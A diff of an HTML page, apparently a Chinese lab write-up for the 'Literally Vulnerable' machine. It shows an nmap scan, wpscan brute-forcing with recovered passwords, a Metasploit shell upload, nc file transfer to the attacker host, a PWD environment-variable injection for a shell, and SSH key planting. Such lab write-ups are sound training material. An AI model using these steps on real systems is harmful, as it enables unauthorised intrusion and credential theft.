@@ -7543,7 +7543,7 @@
   <h1>LiterallyVulnerable</h1>
 
 <h2 id="literally-vulnerable">Literally Vulnerable</h2>
-<p>首先 nmap 扫描端口
+<p>首先 nmap 扫描端口<br />
 nmap -p- -A 192.168.149.179</p>
 <p><img alt="image.png" src="../img/JC4sF90yAIK0_1B-/1594112726338-6500c07c-ab67-4ea9-9ffe-18495df7e410-930986.png" /></p>
 <p>有个 ftp 可以匿名登录</p>
@@ -7554,32 +7554,32 @@ nmap -p- -A 192.168.149.179</p>
 <p><img alt="image.png" src="../img/JC4sF90yAIK0_1B-/1594115290719-cbb387ba-dc65-41f6-85c0-674f26b57af2-441551.png" /></p>
 <p>这里有个验证密码才能看的，用之前 ftp 保存下来的密码试一下</p>
 <p><img alt="image.png" src="../img/JC4sF90yAIK0_1B-/1594115319654-732405f1-3cde-4f58-87a8-0a147f02f9dd-262555.png" /></p>
-<p>wpscan --url <a href="http://192.168.149.179:65535/phpcms/">http://192.168.149.179:65535/phpcms/</a> --enumerate
+<p>wpscan --url <a href="http://192.168.149.179:65535/phpcms/">http://192.168.149.179:65535/phpcms/</a> --enumerate<br />
 收集一下用户名</p>
 <p><img alt="image.png" src="../img/JC4sF90yAIK0_1B-/1594116913025-1a1b919c-e9c5-4a37-bac2-8d9e3a6c30e4-787289.png" /></p>
-<p>wpscan --url <a href="http://192.168.149.179:65535/phpcms/">http://192.168.149.179:65535/phpcms/</a> -U user.txt -P pass.txt
-爆破一下账号密码
+<p>wpscan --url <a href="http://192.168.149.179:65535/phpcms/">http://192.168.149.179:65535/phpcms/</a> -U user.txt -P pass.txt<br />
+爆破一下账号密码<br />
 Username: maybeadmin, Password: $EPid%J2L9LufO5</p>
 <p><img alt="image.png" src="../img/JC4sF90yAIK0_1B-/1594116807427-a51ace7f-9587-4370-80ba-cd4f4dc2bd2b-321944.png" /></p>
-<p>然后登录后台看一下，可以找到另一组账号密码
+<p>然后登录后台看一下，可以找到另一组账号密码<br />
 notadmin:Pa$$w0rd13!&amp;</p>
 <p><img alt="image.png" src="../img/JC4sF90yAIK0_1B-/1594117101095-5dad0776-29d8-4a89-9c35-8a1d6dfcab84-861782.png" /></p>
 <p><img alt="image.png" src="../img/JC4sF90yAIK0_1B-/1594117434636-e24bb863-bbe1-4c13-bf45-e57d70b92c0b-767866.png" /></p>
-<p>然后用 msf 连接一下 exploit/unix/webapp/wp_admin_shell_upload
-notadmin
-Pa$$w0rd13!&amp;
-192.168.149.179
-65535
+<p>然后用 msf 连接一下 exploit/unix/webapp/wp_admin_shell_upload<br />
+notadmin<br />
+Pa$$w0rd13!&amp;<br />
+192.168.149.179<br />
+65535<br />
 /phpcms</p>
 <p>python3 -c 'import pty; pty.spawn("/bin/bash")'  </p>
-<p>在 /home/doe目录下有一个 itseasy 文件，执行会返回当前路径
-wsl：nc -lvp 10001 &gt;itseasy
-靶机：nc 192.168.149.1 10001 &lt;itseasy
+<p>在 /home/doe目录下有一个 itseasy 文件，执行会返回当前路径<br />
+wsl：nc -lvp 10001 &gt;itseasy<br />
+靶机：nc 192.168.149.1 10001 &lt;itseasy<br />
 把这个文件给弄出来，IDA 打开看一下</p>
 <p><img alt="image.png" src="../img/JC4sF90yAIK0_1B-/1594212310437-15974a39-366f-40e5-b640-38b456123d08-787411.png" /></p>
-<p>C 库函数 char <em>getenv(const char </em>name) 搜索 name 所指向的环境字符串，并返回相关的值给字符串，在这里就是 PWD 所指向的，我们可以改一下，从而获得一个 shell
+<p>C 库函数 char <em>getenv(const char </em>name) 搜索 name 所指向的环境字符串，并返回相关的值给字符串，在这里就是 PWD 所指向的，我们可以改一下，从而获得一个 shell<br />
 实际上是请求了 PWD（一个 web 靶机，用上了 IDA 我是没想到的）</p>
-<p><code>export PWD=\$\(/bin/bash\)</code>
+<p><code>export PWD=\$\(/bin/bash\)</code><br />
 然后再执行那个文件就能拿到  john 用户的 shell</p>
 <p><img alt="image.png" src="../img/JC4sF90yAIK0_1B-/1594212675072-9436434c-11c9-4758-9e9b-900d642204cf-849417.png" /></p>
 <p>现在有个问题是 ls，cat 之类的是不回显的，所以考虑一下把 ssh 的 authorized_keys 写成 wsl 的公钥，用 ssh　登上去（john 用户还没有 .ssh 文件夹，新建一个）</p>
